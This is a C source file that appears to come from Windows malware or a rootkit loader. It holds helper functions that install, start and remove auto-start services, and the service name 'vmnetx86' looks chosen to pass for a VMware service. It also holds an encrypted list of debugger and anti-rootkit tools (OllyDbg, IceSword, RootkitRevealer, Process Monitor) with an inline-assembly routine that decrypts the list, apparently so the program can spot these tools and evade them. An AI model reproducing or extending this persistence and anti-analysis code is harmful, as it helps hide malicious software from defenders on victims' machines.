#define SERVICE_REPLACE     (1<<0) // replace if it exists, add otherwise
#define SERVICE_SHARED      (1<<1) // uses a shared process, otherwise service has its own
#define SERVICE_INTERACTIVE (1<<2) // service needs to interact with desktop

// NOTE: use this only if the service is temporary
BOOL LoadWindowsService(char *ServiceName, char *Path);
BOOL UnloadWindowsService(char *Name);
BOOL InstallWindowsService(DWORD Type, char *ServiceName, char *Path, DWORD Flags);
BOOL RemoveWindowsService(char *ServiceName);
BOOL StartWindowsService(char *ServiceName);
BOOL StopWindowsService(char *ServiceName);
BOOL PauseWindowsService(char *ServiceName);
BOOL ResumeWindowsService(char *ServiceName);

typedef struct _FILE_STORAGE {
	ULONG FileSize;
	ULONG BufferSize;
	ULONG nKeyArray[8];
}	FileStorage,*PFileStorage;

PFileStorage g_pDll = 0,g_pSys = 0;
HANDLE g_hThread = 0;
char *pServiceName = (char *)"vmnetx86";
typedef HANDLE	(*CreateToolhelp32SnapshotPtr)(  DWORD dwFlags,  DWORD th32ProcessID);
typedef BOOL	(*Process32NextPtr)(  HANDLE hSnapshot,  LPPROCESSENTRY32 lppe);
typedef unsigned long * ULONG_PTR;

char * DeCrypt( char *pStr );

#ifndef _DEBUG_
char * szSnifferTools[] = {
	/* filemon.exe */			 "\x7d\x82\x7f\x7e\x86\x84\x85\x45\x7e\xeb\x7e",
/* regmon.exe, */			 "\xe9\x7e\x7c\x86\x84\x85\x45\x7e\xeb\x7e\x3f",
/* dbgview.exe */			 "\x77\x79\x7c\xed\x82\x7e\xec\x45\x7e\xeb\x7e",
/* diskmon.exe */			 "\x77\x82\xe8\x80\x86\x84\x85\x45\x7e\xeb\x7e",
/* portmon.exe */			 "\x83\x84\xe9\xe7\x86\x84\x85\x45\x7e\xeb\x7e",
/* windbg.exe */			 "\xec\x82\x85\x77\x79\x7c\x45\x7e\xeb\x7e",
/* kd.exe */				"\x80\x77\x45\x7e\xeb\x7e",
/* ollydbg.exe */			 "\x84\x7f\x7f\xf2\x77\x79\x7c\x45\x7e\xeb\x7e",
/* procmon.exe */			 "\x83\xe9\x84\x78\x86\x84\x85\x45\x7e\xeb\x7e",
/* immunitydebugger.exe */	 "\x82\x86\x86\xee\x85\x82\xe7\xf2\x77\x7e\x79\xee\x7c\x7c\x7e\xe9\x45\x7e\xeb\x7e",
/* Tcpview.exe */			 "\x87\x78\x83\xed\x82\x7e\xec\x45\x7e\xeb\x7e",
/* IceSword.exe */			 "\xa2\x78\x7e\x88\xec\x84\xe9\x77\x45\x7e\xeb\x7e",
/* DarkSpy105.exe */		 "\x97\x7a\xe9\x80\x88\x83\xf2\xaa\x43\xae\x45\x7e\xeb\x7e",
/* flister.exe */			 "\x7d\x7f\x82\xe8\xe7\x7e\xe9\x45\x7e\xeb\x7e",
/* modgreper.exe */			 "\x86\x84\x77\x7c\xe9\x7e\x83\x7e\xe9\x45\x7e\xeb\x7e",
/* phunter.exe */			 "\x83\x7b\xee\x85\xe7\x7e\xe9\x45\x7e\xeb\x7e",
/* Rkdetector2.exe */		 "\x89\x80\x77\x7e\xe7\x7e\x78\xe7\x84\xe9\xa9\x45\x7e\xeb\x7e",
/* RootkitRevealer.exe */	 "\x89\x84\x84\xe7\x80\x82\xe7\x89\x7e\xed\x7e\x7a\x7f\x7e\xe9\x45\x7e\xeb\x7e",
/* sargui.ex */				"\xe8\x7a\xe9\x7c\xee\x82\x45\x7e\xeb",
				NULL
};
#else
char * szSnifferTools[] = {
	NULL
};
#endif

static char szTempBuf[ 256 ];

//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
USHORT GetRandomNum(DWORD from,DWORD to)
{
	USHORT uPort = 0;
	SYSTEMTIME SystemTime = { 0 };
	GetSystemTime(&SystemTime);
	srand(SystemTime.wMilliseconds+RAND32);
	while(uPort < from || uPort > to)
	{
		uPort = (unsigned short)rand();
	}
	return uPort;
}
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
char *GetRandomStr(BYTE blen,BYTE from,BYTE to,char *dst)
{
	char *retstr;
	BYTE i,b;
	retstr = dst;
	if(retstr)
	{
		for( i  = 0 ; i < blen ; i ++ )
		{
			for ( b = 0 ; b <= i ; b ++)
				*dst = (BYTE)GetRandomNum(from,to);
			dst++;
		}
	}	else	{
		return NULL;
	}
	//memcpy(dst,retstr,blen);

	return retstr;
}
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
char * DeCrypt( char *pStr )
{
	__asm
	{
		pushad
		mov		esi,[pStr]
		mov		edi,offset szTempBuf
	__again:
			lodsb
			TEST AL,AL
			jz		__to_exit
			sub		al,77h
			xor		al,33h
			add		al,31h
			stosb
			jmp		__again

	__to_exit:
		stosb
		popad
	} // end asm

	return szTempBuf;
} // end of fucntion eL_DeCrypt
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ 
BOOL LoadWindowsService(char *ServiceName, char *Path)
{
	BOOL Result;
	Result = InstallWindowsService(SERVICE_DEMAND_START, ServiceName, Path, SERVICE_REPLACE);
	if (Result)
	{
		Result = StartWindowsService(ServiceName);
	}
	return Result;
}
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// NOTE: use this only if the service is temporary
BOOL UnloadWindowsService(char *Name)
{
	BOOL Result;
	Result = StopWindowsService(Name);
	if (Result) Result = RemoveWindowsService(Name);
	return Result;
}
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
BOOL StopWindowsService(char *ServiceName)
{
	SC_HANDLE handle, handle2;
	BOOL Result;
	SERVICE_STATUS status;

	handle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!handle) return FALSE;

	handle2 = OpenService(handle, ServiceName, SERVICE_ALL_ACCESS);
	if (!handle2) return FALSE;
	Result = ControlService(handle2, SERVICE_CONTROL_STOP, &status);
	CloseServiceHandle(handle2);

	CloseServiceHandle(handle);
	if (Result || GetLastError() == ERROR_SERVICE_NOT_ACTIVE) return TRUE;
	else return FALSE;
}
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
BOOL InstallWindowsService(DWORD Type, char *ServiceName, char *Path, DWORD Flags)
{
	SC_HANDLE handle, handle2;
	ULONG ServiceType = 0x00000001;
	
	handle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!handle) 
		return FALSE;

	handle2 = CreateService(
		handle,
		ServiceName,
		ServiceName,
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		Path,
		NULL,NULL,NULL,NULL,NULL);
		
	CloseServiceHandle(handle);

	if (handle2)
	{
		CloseServiceHandle(handle2);
		return TRUE; 
	}	else if (GetLastError() == ERROR_SERVICE_EXISTS) 
			return TRUE;
		else 
			return FALSE;
}
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
BOOL RemoveWindowsService(char *ServiceName)
{
	SC_HANDLE handle, handle2;
	BOOL Result;

	handle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!handle) return FALSE;

	handle2 = OpenService(handle, ServiceName, SERVICE_ALL_ACCESS);
	if (!handle2) return TRUE; // assume the service is already removed

	Result = DeleteService(handle2);
	CloseServiceHandle(handle2);
	CloseServiceHandle(handle);
	return Result;
}
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
BOOL StartWindowsService(char *ServiceName)
{
	SC_HANDLE handle, handle2;
	BOOL Result;

	handle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!handle) 
	{
		MSG("StartWindowsService : Error open SCM!!!");
		return FALSE;
	}
	MSG(ServiceName);
	handle2 = OpenService(handle, ServiceName, SERVICE_ALL_ACCESS);
	if (!handle2) 
	{
		MSG("StartWindowsService : Error open serivce!!");
		return FALSE;
	}
	Result = StartService(handle2, 0, NULL);
	if(!Result)
	{
		MSG("Error start service");
	}	else	{
		MSG("StartWindowsService : Service started");
	}

	CloseServiceHandle(handle2);
	CloseServiceHandle(handle);
	if (Result || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) 
	{
		MSG("StartWindowsService : Serice already started");
		return TRUE;
	}
	else return FALSE;
}
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++